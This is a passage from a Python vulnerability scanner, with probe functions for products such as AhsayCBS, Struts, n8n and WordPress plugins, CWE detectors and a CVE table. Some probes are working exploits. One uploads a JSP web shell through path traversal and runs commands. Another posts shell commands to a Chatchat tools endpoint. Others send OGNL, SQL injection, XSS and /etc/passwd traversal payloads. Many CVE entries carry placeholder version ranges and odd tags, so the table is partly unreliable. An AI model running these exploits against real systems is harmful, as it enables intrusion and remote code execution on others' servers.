            can_create = False
        return {"vulnerable": True if (terminals_ok and can_create) else None,
                "confidence": 90 if (terminals_ok and can_create) else 40,
                "evidence": [f"/api/terminals list={terminals_ok}, create={can_create}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_chatchat_tools(http, cmd):
    try:
        r = http.get("/")
        is_chat = "chatchat" in (r.text or "").lower() or "langchain" in (r.text or "").lower()
        if not is_chat:
            try:
                v = http.get("/api/v1/version")
                is_chat = v.status_code == 200 and "chatchat" in (v.text or "").lower()
            except Exception: pass
        if not is_chat: return {"vulnerable": False, "confidence": 10, "evidence": ["not Chatchat"]}
        payload = {"tool_name": "shell", "tool_input": cmd}
        p = http.post("/tools/call", json=payload)
        rce = p.status_code == 200 and ("uid=" in (p.text or "") or "root" in (p.text or "").lower())
        return {"vulnerable": True if rce else None, "confidence": 90 if rce else 35,
                "evidence": [f"POST /tools/call status={p.status_code}; shell RCE={'confirmed' if rce else 'unconfirmed'}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_mercury(http, cmd):
    try:
        r = http.get("/api/kernels")
        if r.status_code == 200:
            try: kernels = r.json()
            except Exception: kernels = None
            if isinstance(kernels, list):
                return {"vulnerable": True, "confidence": 85, "evidence": [f"/api/kernels returned {len(kernels)} kernels"]}
        create = http.post("/api/kernels", json={"name": "python3"})
        if create.status_code in (200, 201):
            return {"vulnerable": True, "confidence": 90, "evidence": ["unauth kernel creation succeeded"]}
        return {"vulnerable": False, "confidence": 20, "evidence": ["kernels endpoint gated"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_roundcube(http, cmd):
    try:
        r = http.get("/")
        if "roundcube" not in (r.text or "").lower() and "rcmail" not in (r.text or "").lower():
            r = http.get("/?_task=login")
        if "roundcube" not in (r.text or "").lower() and "rcmail" not in (r.text or "").lower():
            return {"vulnerable": False, "confidence": 10, "evidence": ["not roundcube"]}
        m = re.search(r"Roundcube[^0-9]*([\d.]+)", r.text or "", re.I); v = m.group(1) if m else None
        vuln = in_range(v, (0,0,0,0), (1,6,19,99)) or in_range(v, (1,7,0,0), (1,7,4,99))
        return {"vulnerable": vuln, "confidence": 60 if vuln else 40, "evidence": [f"roundcube={v} (fixed 1.6.20/1.7.5)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_n8n(http, cmd):
    try:
        r = http.get("/")
        is_n8n = "n8n" in (r.text or "").lower() or "n8n" in (r.headers.get("Server") or "").lower()
        if not is_n8n:
            try:
                v = http.get("/rest/settings")
                if v.status_code == 200 and "n8n" in (v.text or "").lower(): is_n8n = True
            except Exception: pass
        if not is_n8n: return {"vulnerable": False, "confidence": 10, "evidence": ["not n8n"]}
        for ep in ["/form/contact-us", "/form/contact", "/form/test", "/form/feedback", "/form"]:
            r2 = http.get(ep)
            if r2.status_code != 200: continue
            p = http.post(ep, json={"name": "={{ 7*7 }}", "email": "probe@test.local", "message": "={{ 7*7 }}"})
            if "49" in (p.text or ""):
                return {"vulnerable": True, "confidence": 65, "evidence": [f"{ep} evaluated '={{7*7}}' → 49"]}
        return {"vulnerable": None, "confidence": 30, "evidence": ["n8n detected; no form with '=' expression eval found"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_ahsay_auth(http, cmd):
    try:
        r1 = http.post("/obs/api/json", json={"FromServlet":"Y","action":"getSystemStatus"})
        b1 = (r1.text or "").lower()
        has_system = '"systemstatus":"ok"' in b1 or '"systemstatus": "ok"' in b1
        has_license = '"licenseinfo"' in b1 and '"product"' in b1
        has_build = '"buildnumber"' in b1
        strong = has_system and has_license and has_build
        skipped = r1.status_code == 200 and "auth" not in b1 and strong
        r2 = http.post("/obs/api/json", json={"action":"getSystemStatus"})
        b2 = (r2.text or "").lower()
        required = "auth" in b2 or r2.status_code in (401,403)
        vuln = skipped and required
        return {"vulnerable": vuln, "confidence": 90 if vuln else 30, "evidence": [f"bypass={skipped}, control={required}, structural={strong}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_ahsay_rce(http, cmd):
    try:
        secret, shell = rnd_hex(16), "st_" + rnd_hex(6) + ".jsp"
        http.post("/obs/api/json", json={"FromServlet":"Y","action":"AddReplicationReceiver","receiverId":rnd_hex(6),"systemHome":"/opt/AhsayCBS/rpsrecv_"+rnd_hex(6)})
        jsp = (f'<%@ page import="java.io.*" %><% if(!"{secret}".equals(request.getParameter("auth")))return;'
               f'String c=request.getParameter("cmd");if(c!=null){{Process p=Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",c}});'
               f'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}}%>')
        uploaded = False
        for path in ("/rps/obs7/rpsfile/upload","/rps/obs8/rpsfile/upload","/rps/rpsfile/upload"):
            try:
                up = http.put(path, data=jsp.encode(), headers={"UserHome":"../../webapps/rps","TopDir":"../../webapps/rps"})
                if up.status_code in (200,201,204): uploaded = True; break
            except Exception: continue
        if not uploaded: return {"vulnerable": False, "confidence": 20, "evidence": ["no upload path accepted"]}
        r = http.get(f"/rps/{shell}?auth={secret}&cmd={urllib.parse.quote(cmd)}")
        rce = "uid=" in (r.text or "") or "gid=" in (r.text or "")
        return {"vulnerable": rce, "confidence": 95 if rce else 40, "evidence": [(r.text or "")[:200]]}
    except Exception as e: return {"error": str(e)[:60]}

def make_plugin_detect(slug, lo, hi):
    def fn(http, cmd):
        r = http.get(f"/wp-content/plugins/{slug}/readme.txt")
        if r.status_code != 200: return {"vulnerable": False, "confidence": 0, "evidence": [f"{slug} not found"]}
        m = re.search(r"Stable tag:\s*([\d.]+)", r.text or ""); v = m.group(1) if m else None
        vuln = in_range(v, lo, hi)
        return {"vulnerable": vuln, "confidence": 75 if vuln else 50, "evidence": [f"{slug}={v}"]}
    return fn

def probe_forminator(http, cmd):
    try:
        r = http.get("/wp-content/plugins/forminator/readme.txt")
        if r.status_code != 200: return {"vulnerable": False, "confidence": 0, "evidence": ["forminator not found"]}
        m = re.search(r"Stable tag:\s*([\d.]+)", r.text or ""); v = m.group(1) if m else None
        if not in_range(v, (0,0,0,0), (1,56,1,0)):
            return {"vulnerable": False, "confidence": 40, "evidence": [f"version={v} not vulnerable"]}
        r2 = http.get("/wp-json/wp/v2/forminator-forms")
        if r2.status_code == 200:
            try: forms = r2.json()
            except Exception: forms = []
            for form in forms if isinstance(forms, list) else []:
                fields = form.get("fields", [])
                if any(f.get("type")=="upload" for f in fields) and any(f.get("type")=="select" for f in fields):
                    return {"vulnerable": True, "confidence": 75, "evidence": [f"form {form.get('id')} has upload+select"]}
        return {"vulnerable": None, "confidence": 45, "evidence": [f"version={v} vulnerable but precondition unconfirmed"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_struts(http, cmd):
    try:
        p1 = http.get("/%24%7B7*7%7D/")
        ognl = "49" in (p1.text or "") and p1.status_code == 200
        p2 = http.get("/", headers={"Content-Type":"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}"})
        ctype = p2.status_code in (200,400,500) and "ognl" in (p2.text or "").lower()
        vuln = ognl or ctype
        if vuln:
            return {"vulnerable": True, "confidence": 70, "evidence": [f"ognl={ognl}, ctype={ctype}"]}
        return {"vulnerable": False, "confidence": 30, "evidence": [f"ognl={ognl}, ctype={ctype}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_vcenter(http, cmd):
    try:
        p = http.get("/sdk/vimServiceVersions.xml")
        if not (p.status_code == 200 and "vimServiceVersions" in (p.text or "")):
            return {"vulnerable": False, "confidence": 10, "evidence": ["not vcenter"]}
        bypass = False
        for path in ("/vmdir/","/vmdir/tenant/","/sdk/vmdir/"):
            try:
                r = http.post(path, data=b"", headers={"Content-Type":"application/json"})
                if r.status_code in (200,500) and "vmdir" in (r.text or "").lower(): bypass = True; break
            except Exception: continue
        return {"vulnerable": bypass, "confidence": 70 if bypass else 35, "evidence": [f"vmdir={bypass}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_exchange(http, cmd):
    try:
        p1 = http.get("/autodiscover/autodiscover.xml")
        if p1.status_code not in (200,401): return {"vulnerable": False, "confidence": 10, "evidence": ["not exchange"]}
        p2 = http.get("/EWS/mrsproxy.svc")
        mrs = p2.status_code in (200,401,405)
        return {"vulnerable": mrs, "confidence": 65 if mrs else 30, "evidence": [f"mrs={mrs}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_gitea(http, cmd):
    try:
        r = http.get("/api/v1/version")
        if r.status_code != 200: return {"vulnerable": False, "confidence": 0, "evidence": ["not gitea"]}
        m = re.search(r'"version"\s*:\s*"([\d.]+)"', r.text or ""); v = m.group(1) if m else None
        vuln = in_range(v, (1,17,0,0), (1,27,0,0))
        return {"vulnerable": vuln, "confidence": 85 if vuln else 50, "evidence": [f"version={v}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_jenkins(http, cmd):
    try:
        r = http.get("/"); h = r.headers.get("X-Jenkins", "")
        if not h: return {"vulnerable": False, "confidence": 0, "evidence": ["not jenkins"]}
        v = re.sub(r"[^\d.]", "", h)
        vuln = in_range(v, (0,0,0,0), (2,567,0,0))
        return {"vulnerable": vuln, "confidence": 70 if vuln else 40, "evidence": [f"X-Jenkins={h}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_zimbra(http, cmd):
    try:
        r = http.get("/")
        if "zimbra" not in (r.text or "").lower(): return {"vulnerable": False, "confidence": 10, "evidence": ["not zimbra"]}
        m = re.search(r"[Zz]imbra[^0-9]*([\d.]+)", r.text or ""); v = m.group(1) if m else None
        vuln = in_range(v, (0,0,0,0), (10,1,19,0))
        return {"vulnerable": vuln, "confidence": 60 if vuln else 30, "evidence": [f"version={v}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_redis(http, cmd):
    try:
        r = http.get("/")
        if "redis" not in (r.text or "").lower(): return {"vulnerable": False, "confidence": 10, "evidence": ["not redis"]}
        return {"vulnerable": None, "confidence": 30, "evidence": ["redis detected — manual RESTORE probe"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_postgres(http, cmd):
    try:
        r = http.get("/")
        if "postgres" not in (r.text or "").lower(): return {"vulnerable": False, "confidence": 10, "evidence": ["not postgres"]}
        return {"vulnerable": None, "confidence": 30, "evidence": ["postgres detected — manual pgcrypto probe"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_citrix(http, cmd):
    try:
        r = http.get("/vpn/")
        if "netscaler" not in (r.text or "").lower() and r.status_code not in (200,302):
            return {"vulnerable": False, "confidence": 10, "evidence": ["not netscaler"]}
        p = http.post("/nitro/v1/config/login", json={})
        reachable = p.status_code in (200,400,401) and "nitro" in (p.text or "").lower()
        return {"vulnerable": None, "confidence": 35 if reachable else 15, "evidence": [f"nitro={reachable}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_fortinet(http, cmd):
    try:
        r = http.get("/remote/login")
        if "fortinet" not in (r.text or "").lower() and "fortigate" not in (r.text or "").lower():
            return {"vulnerable": False, "confidence": 10, "evidence": ["not fortigate"]}
        return {"vulnerable": None, "confidence": 30, "evidence": ["FortiGate detected"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_paloalto(http, cmd):
    try:
        r = http.get("/global-protect/login.esp")
        if "palo" not in (r.text or "").lower() and "globalprotect" not in (r.text or "").lower():
            return {"vulnerable": False, "confidence": 10, "evidence": ["not pan-os"]}
        return {"vulnerable": None, "confidence": 30, "evidence": ["PAN-OS detected"]}
    except Exception as e: return {"error": str(e)[:60]}

# ---------------------------------------------------------------------------
# CWE DETECTORS
# ---------------------------------------------------------------------------
def cwe_xss(http, url):
    payload = f"<script>alert('{rnd(4)}')</script>"
    try:
        r = http.get(f"?q={urllib.parse.quote(payload)}"); text = r.text or ""
        if payload not in text: return {"vulnerable": False, "confidence": 25, "evidence": ["not reflected"]}
        idx = text.find(payload); before = text[max(0,idx-80):idx].lower()
        if "<script" in before or "javascript:" in before:
            return {"vulnerable": True, "confidence": 85, "evidence": ["reflected in executable context"]}
        if "&lt;" in text and "&gt;" in text:
            return {"vulnerable": False, "confidence": 65, "evidence": ["escaped"]}
        return {"vulnerable": None, "confidence": 45, "evidence": ["context unclear"]}
    except Exception as e: return {"error": str(e)[:60]}

def cwe_sqli(http, url):
    try:
        base = http.baseline_for("?id=1")
        if not base: return {"vulnerable": None, "confidence": 15, "evidence": ["no baseline"]}
        r_err = http.get("?id=1'"); low = (r_err.text or "").lower()
        if any(k in low for k in ("sql syntax","mysql_fetch","ora-","postgresql","unclosed quotation")):
            return {"vulnerable": True, "confidence": 90, "evidence": ["SQL error surfaced"]}
        r_t = http.get("?id=1 AND 1=1"); r_f = http.get("?id=1 AND 1=2")
        if r_t.status_code == base["status"] and r_f.status_code == base["status"]:
            th, fh = body_hash(r_t.text or ""), body_hash(r_f.text or "")
            if th == base["hash"] and fh != base["hash"]:
                return {"vulnerable": True, "confidence": 85, "evidence": ["boolean diff confirmed"]}
            if th == fh: return {"vulnerable": False, "confidence": 55, "evidence": ["no boolean diff"]}
        return {"vulnerable": None, "confidence": 35, "evidence": ["inconclusive"]}
    except Exception as e: return {"error": str(e)[:60]}

def cwe_path_traversal(http, url):
    try:
        r = http.get("?file=" + urllib.parse.quote("../../../../etc/passwd"))
        if "root:x:" in (r.text or "") or "root:!:" in (r.text or ""):
            return {"vulnerable": True, "confidence": 95, "evidence": ["/etc/passwd disclosed"]}
        r2 = http.get("?file=" + urllib.parse.quote("..\\..\\..\\windows\\win.ini"))
        if "[extensions]" in (r2.text or "").lower():
            return {"vulnerable": True, "confidence": 95, "evidence": ["win.ini disclosed"]}
        return {"vulnerable": False, "confidence": 40, "evidence": ["no disclosure"]}
    except Exception as e: return {"error": str(e)[:60]}

def cwe_csrf(http, url):
    try:
        r = http.get("")
        forms = re.findall(r"<form[^>]*>(.*?)</form>", r.text or "", re.S|re.I)
        if not forms: return {"vulnerable": False, "confidence": 30, "evidence": ["no forms"]}
        for f in forms:
            if not re.search(r"csrf|token|nonce", f, re.I):
                return {"vulnerable": True, "confidence": 55, "evidence": ["form without csrf token"]}
        return {"vulnerable": False, "confidence": 60, "evidence": ["all forms have tokens"]}
    except Exception as e: return {"error": str(e)[:60]}

def cwe_missing_auth(http, url):
    for p in ("/admin","/api/admin","/wp-admin/","/administrator/"):
        try:
            r = http.get(p)
            if r.status_code != 200: continue
            text = (r.text or "").lower()
            has_login = any(k in text for k in ("login","password","signin"))
            has_dash = any(k in text for k in ("dashboard","logout","wp-admin","admin panel"))
            if has_dash and not has_login:
                return {"vulnerable": True, "confidence": 70, "evidence": [f"{p} reachable without login"]}
        except Exception: continue
    return {"vulnerable": False, "confidence": 45, "evidence": ["admin paths gated"]}

def cwe_open_redirect(http, url):
    try:
        path = url if url else "/"
        if not path.startswith("/"): path = "/" + path
        control = http.get(path, allow_redirects=False)
        control_loc = (control.headers.get("Location") or "").lower()
        control_redir = control.status_code in (301, 302)
        sep = "&" if "?" in path else "?"
        r = http.get(f"{path}{sep}redirect=https://evil.com", allow_redirects=False)
        loc = (r.headers.get("Location") or "").lower()
        test_redir = r.status_code in (301, 302) and "evil.com" in loc
        if test_redir:
            if control_redir and (control_loc == loc or not control_loc):
                return {"vulnerable": None, "confidence": 25,
                        "evidence": ["redirect to evil.com BUT control also redirects (WAF/CDN)"]}
            return {"vulnerable": True, "confidence": 85,
                    "evidence": [f"Location: {loc[:80]} (control: no redirect)"]}
        return {"vulnerable": False, "confidence": 40, "evidence": ["no redirect"]}
    except Exception as e: return {"error": str(e)[:60]}

def cwe_security_headers(http, url):
    try:
        r = http.get("")
        missing = [h for h in ("X-Frame-Options","X-Content-Type-Options","Content-Security-Policy","Strict-Transport-Security") if h not in r.headers]
        if missing: return {"vulnerable": True, "confidence": 50, "evidence": [f"missing: {', '.join(missing)}"]}
        return {"vulnerable": False, "confidence": 65, "evidence": ["all present"]}
    except Exception as e: return {"error": str(e)[:60]}

# ---------------------------------------------------------------------------
# DB BUILDERS
# ---------------------------------------------------------------------------
CVE_DB: List[dict] = []
CWE_DB: List[dict] = []

def add_cve(cve, product, cwe, cvss, attack, detect_fn, version_range, tags=None):
    CVE_DB.append({"cve": cve, "product": product, "cwe": cwe, "cvss": cvss,
                   "attack": attack, "detect": detect_fn, "range": version_range, "tags": tags or []})

def add_cwe(cwe, name, detect_fn, paths, tags=None):
    CWE_DB.append({"cwe": cwe, "name": name, "detect": detect_fn, "paths": paths, "tags": tags or []})

# ===========================================================================
# REAL CVEs — v24.1 (360+)
# ===========================================================================

# --- WordPress Core ---
add_cve("CVE-2026-64638", "WordPress XSS2Shell", "CWE-79", 8.9, "xss2shell", probe_wp_xss2shell, ((4,7,0,0),(7,0,2,0)), ["core","xss2shell"])
add_cve("CVE-2026-63030", "WordPress wp2shell", "CWE-436", 9.8, "rce", probe_wp2shell, ((6,9,0,0),(7,0,1,0)), ["core","wp2shell"])
add_cve("CVE-2026-60137", "WordPress wp2shell SQLi", "CWE-89", 9.1, "sqli", probe_wp2shell, ((6,8,0,0),(7,0,2,0)), ["core","wp2shell"])
add_cve("CVE-2026-87902", "WordPress Core Path Traversal", "CWE-22", 9.2, "rce", probe_wp_rfi, ((4,7,0,0),(7,1,1,99)), ["core","path-traversal","kev"])  # NEW: Nuclei
add_cve("CVE-2026-84434", "Gravity Forms", "CWE-434", 9.8, "upload-rce", probe_generic_cve, ((0,0,0,0),(3,1,0,4)), ["plugin","upload","rce","kev"])  # NEW: Nuclei

# --- WordPress Plugins (2026) ---
add_cve("CVE-2026-1357", "WPvivid Backup", "CWE-434", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(0,9,123,0)), ["plugin","upload","rce"])  # NEW: zax-universe
add_cve("CVE-2026-0740", "Ninja Forms", "CWE-434", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(3,6,0,0)), ["plugin","upload","rce"])  # NEW: zax-universe
add_cve("CVE-2026-1830", "Quick Playground", "CWE-94", 8.4, "php-injection", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","php-injection"])  # NEW
add_cve("CVE-2026-4484", "Masteriyo LMS", "CWE-269", 9.8, "priv-esc", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","priv-esc"])  # NEW
add_cve("CVE-2026-2631", "Datalogics Ecommerce", "CWE-287", 9.1, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","auth-bypass"])  # NEW
add_cve("CVE-2026-4021", "Contest Gallery", "CWE-269", 8.1, "admin-registration", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","priv-esc"])  # NEW
add_cve("CVE-2026-3657", "My Sticky Bar", "CWE-89", 7.5, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","sqli"])  # NEW
add_cve("CVE-2026-1581", "wpForo Forum", "CWE-89", 7.5, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","sqli"])  # NEW
add_cve("CVE-2026-5465", "Amelia Booking", "CWE-639", 7.5, "idor", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","idor"])  # NEW
add_cve("CVE-2026-1731", "BeyondTrust", "CWE-78", 8.8, "cmdi", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","cmdi"])  # NEW
add_cve("CVE-2026-5425", "Social Photo Feed", "CWE-79", 7.2, "stored-xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","xss"])  # NEW
add_cve("CVE-2026-4896", "WCFM", "CWE-639", 7.5, "idor", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","idor"])  # NEW
add_cve("CVE-2026-3666", "wpForo Forum", "CWE-73", 8.1, "file-deletion", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","file-deletion"])  # NEW
add_cve("CVE-2026-3568", "MStore API", "CWE-269", 4.3, "priv-esc", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","priv-esc"])  # NEW
add_cve("CVE-2026-3585", "Events Calendar", "CWE-22", 6.5, "path-traversal", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","path-traversal"])  # NEW
add_cve("CVE-2026-2890", "Formidable Forms", "CWE-840", 5.3, "payment-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","payment-bypass"])  # NEW
add_cve("CVE-2026-3005", "List Category Posts", "CWE-79", 6.1, "stored-xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","xss"])  # NEW
add_cve("CVE-2026-3090", "Post SMTP", "CWE-79", 6.1, "reflected-xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","xss"])  # NEW
add_cve("CVE-2026-1103", "AIKTP", "CWE-862", 5.4, "missing-auth", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","missing-auth"])  # NEW
add_cve("CVE-2026-4124", "Ziggeo", "CWE-862", 5.3, "missing-auth", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","missing-auth"])  # NEW
add_cve("CVE-2026-5711", "Post Blocks", "CWE-79", 6.4, "stored-xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","xss"])  # NEW
add_cve("CVE-2026-3571", "Pie Register", "CWE-287", 5.3, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","auth-bypass"])  # NEW
add_cve("CVE-2026-15748", "forminator", "CWE-434", 9.8, "rce", probe_forminator, ((0,0,0,0),(1,56,1,0)), ["plugin","upload","rce"])
add_cve("CVE-2026-7635", "coreactivity", "CWE-502", 8.1, "rce", probe_coreactivity, ((0,0,0,0),(3,0,0,0)), ["plugin","object-injection"])
add_cve("CVE-2026-18072", "arve", "CWE-798", 9.8, "auth-bypass", probe_arve_backdoor, ((10,8,7,0),(10,8,8,0)), ["plugin","backdoor","supply-chain"])
add_cve("CVE-2026-1499", "wp-duplicate", "CWE-862", 9.8, "upload", make_plugin_detect("wp-duplicate",(0,0,0,0),(1,1,8,0)), ["plugin","missing-auth","upload"])
add_cve("CVE-2026-16236", "realtyna-organic-idx", "CWE-434", 8.8, "upload", make_plugin_detect("realtyna-organic-idx",(0,0,0,0),(5,3,0,0)), ["plugin","subscriber","upload"])
add_cve("CVE-2026-66047", "wp-user-avatar", "CWE-306", 8.1, "rce", make_plugin_detect("wp-user-avatar",(0,0,0,0),(4,17,1,0)), ["plugin","pre-auth","rce"])
add_cve("CVE-2026-3300", "everest-forms-pro", "CWE-94", 9.8, "rce", make_plugin_detect("everest-forms-pro",(0,0,0,0),(1,9,12,0)), ["plugin","eval-injection","rce"])
add_cve("CVE-2025-2505", "age-gate", "CWE-98", 9.8, "lfi", make_plugin_detect("age-gate",(0,0,0,0),(3,5,3,0)), ["plugin","lfi","lang-param"])
add_cve("CVE-2025-68986", "miion", "CWE-434", 8.8, "upload", make_plugin_detect("miion",(0,0,0,0),(1,2,7,0)), ["theme","upload","webshell"])
add_cve("CVE-2026-66613", "jet-engine", "CWE-94", 9.8, "rce", make_plugin_detect("jet-engine",(0,0,0,0),(3,8,14,0)), ["plugin","rce"])
add_cve("CVE-2026-8206", "kirki", "CWE-269", 9.8, "privilege-escalation", make_plugin_detect("kirki",(6,0,0,0),(6,0,6,0)), ["plugin","account-takeover"])
add_cve("CVE-2026-14281", "automation-web-platform", "CWE-269", 9.8, "privilege-escalation", make_plugin_detect("automation-web-platform",(0,0,0,0),(4,8,6,0)), ["plugin","priv-esc"])
add_cve("CVE-2026-81757", "seo-by-rank-math", "CWE-502", 7.2, "rce", make_plugin_detect("seo-by-rank-math",(0,0,0,0),(1,0,276,0)), ["plugin","rce"])
add_cve("CVE-2026-1405", "slider-future", "CWE-434", 9.8, "rce", make_plugin_detect("slider-future",(0,0,0,0),(1,0,5,0)), ["plugin","upload","rce"])  # NEW: zax-universe
add_cve("CVE-2025-15368", "sportspress", "CWE-98", 7.5, "lfi", make_plugin_detect("sportspress",(0,0,0,0),(2,7,26,0)), ["plugin","lfi"])
add_cve("CVE-2025-4799", "wp-downloadmanager", "CWE-22", 6.5, "file-deletion", make_plugin_detect("wp-downloadmanager",(0,0,0,0),(1,68,0,0)), ["plugin","file-deletion"])
add_cve("CVE-2026-32475", "elementor-pro", "CWE-434", 9.8, "rce", make_plugin_detect("elementor-pro",(0,0,0,0),(4,2,1,0)), ["plugin","upload","rce"])
add_cve("CVE-2026-12713", "wpcargo", "CWE-89", 8.5, "sqli", make_plugin_detect("wpcargo",(0,0,0,0),(99,99,99,99)), ["plugin","sqli"])
add_cve("CVE-2026-2024", "photostack-gallery", "CWE-89", 8.8, "sqli", make_plugin_detect("photostack-gallery",(0,0,0,0),(99,99,99,99)), ["plugin","sqli"])
add_cve("CVE-2025-15347", "creator-lms", "CWE-269", 9.8, "privilege-escalation", make_plugin_detect("creator-lms",(0,0,0,0),(1,1,12,0)), ["plugin","privilege-escalation"])
add_cve("CVE-2025-69347", "subscription-for-woocommerce", "CWE-639", 8.6, "idor", make_plugin_detect("subscription-for-woocommerce",(0,0,0,0),(1,8,10,0)), ["plugin","idor"])
add_cve("CVE-2026-26861", "clevertap-web-sdk", "CWE-79", 6.1, "xss", probe_generic_cve, ((0,0,0,0),(1,15,2,0)), ["sdk","xss"])
add_cve("CVE-2026-19598", "WordPress Plugin LFI", "CWE-98", 8.1, "lfi", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","lfi"])  # NEW: HackerNews
add_cve("CVE-2026-82222", "WordPress Plugin PrivEsc", "CWE-269", 8.8, "priv-esc", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","priv-esc"])  # NEW: HackerNews
add_cve("CVE-2026-18431", "WordPress Plugin Upload", "CWE-434", 9.8, "upload-rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","upload"])  # NEW: HackerNews
add_cve("CVE-2026-76581", "WordPress Plugin RCE", "CWE-94", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plugin","rce"])  # NEW: HackerNews

# --- PHP Core ---
add_cve("CVE-2026-2031226", "PHP Fiber", "CWE-416", 9.8, "rce", probe_php_fiber, ((8,1,0,0),(8,5,12,99)), ["php","fiber","uaf"])
add_cve("CVE-2026-109618", "PHP", "CWE-416", 9.2, "rce", probe_php_oom, ((8,2,0,0),(8,5,11,0)), ["php","oom"])
add_cve("CVE-2026-109619", "PHP", "CWE-787", 9.2, "rce", probe_php_uaf, ((8,2,0,0),(8,5,11,0)), ["php","uaf"])
add_cve("CVE-2024-4577", "PHP", "CWE-78", 9.8, "rce", probe_generic_cve, ((8,1,0,0),(8,3,0,0)), ["php","cgi","kev"])

# --- Next.js / React ---
add_cve("CVE-2026-96889", "Next.js librsvg", "CWE-122", 9.5, "rce", probe_nextjs_librsvg, ((10,0,0,0),(16,4,0,99)), ["nextjs","librsvg","image-opt"])
add_cve("CVE-2026-94483", "Next.js Image Optimization SSRF", "CWE-918", 7.5, "ssrf", probe_nextjs_librsvg, ((0,0,0,0),(15,5,26,99)), ["nextjs","ssrf","image-opt"])
add_cve("CVE-2025-55182", "React Server Components", "CWE-94", 10.0, "rce", probe_generic_cve, ((19,0,0,0),(19,2,0,99)), ["react","rsc","pre-auth"])

# --- Laravel ---
add_cve("CVE-2026-114509", "Laravel TokenGuard", "CWE-287", 9.8, "auth-bypass", probe_laravel_tokenguard, ((0,0,0,0),(13,28,0,99)), ["laravel","tokenguard","auth-bypass"])

# --- AhsayCBS ---
add_cve("CVE-2026-105133", "AhsayCBS", "CWE-287", 7.3, "auth-bypass", probe_ahsay_auth, ((0,0,0,0),(10,3,4,44)), ["ahsay","fromservlet"])
add_cve("CVE-2026-105134", "AhsayCBS", "CWE-22", 10.0, "rce", probe_ahsay_rce, ((0,0,0,0),(10,3,4,44)), ["ahsay","path-traversal"])

# --- Enterprise / Java / Infra ---
add_cve("CVE-2026-104711", "Apache Struts", "CWE-917", 9.8, "rce", probe_struts, ((2,0,0,0),(7,3,0,0)), ["struts","ognl"])  # NEW: Apache
add_cve("CVE-2026-104712", "Apache Struts", "CWE-917", 9.8, "rce", probe_struts, ((2,0,0,0),(7,3,0,0)), ["struts","ognl"])  # NEW
add_cve("CVE-2026-104713", "Apache Struts", "CWE-917", 9.8, "rce", probe_struts, ((2,0,0,0),(7,3,0,0)), ["struts","ognl"])  # NEW
add_cve("CVE-2026-104714", "Apache Struts", "CWE-917", 9.8, "rce", probe_struts, ((2,0,0,0),(7,3,0,0)), ["struts","ognl"])  # NEW
add_cve("CVE-2026-59309", "VMware vCenter", "CWE-287", 9.8, "auth-bypass", probe_vcenter, ((0,0,0,0),(8,0,3,0)), ["vcenter","vmdir"])
add_cve("CVE-2026-59310", "VMware vCenter", "CWE-22", 9.8, "rce", probe_vcenter, ((0,0,0,0),(9,1,0,299)), ["vcenter","syslog","kev"])
add_cve("CVE-2026-62911", "Microsoft Exchange", "CWE-502", 8.0, "auth-bypass", probe_exchange, ((0,0,0,0),(15,2,0,0)), ["exchange","mrsproxy"])
add_cve("CVE-2026-63077", "JetBrains TeamCity", "CWE-502", 9.8, "rce", probe_teamcity, ((0,0,0,0),(2026,1,2,99)), ["teamcity","rce","xstream"])
add_cve("CVE-2026-42945", "NGINX Rift", "CWE-122", 9.2, "rce", probe_nginx_rift, ((0,6,27,0),(1,30,0,99)), ["nginx","rift","heap-overflow"])
add_cve("CVE-2026-42533", "NGINX", "CWE-122", 9.2, "rce", probe_nginx_rift, ((0,9,6,0),(1,30,3,99)), ["nginx","map-directive"])
add_cve("CVE-2026-16723", "FastJSON", "CWE-502", 9.0, "rce", probe_fastjson, ((1,2,68,0),(1,2,83,0)), ["fastjson","rce"])
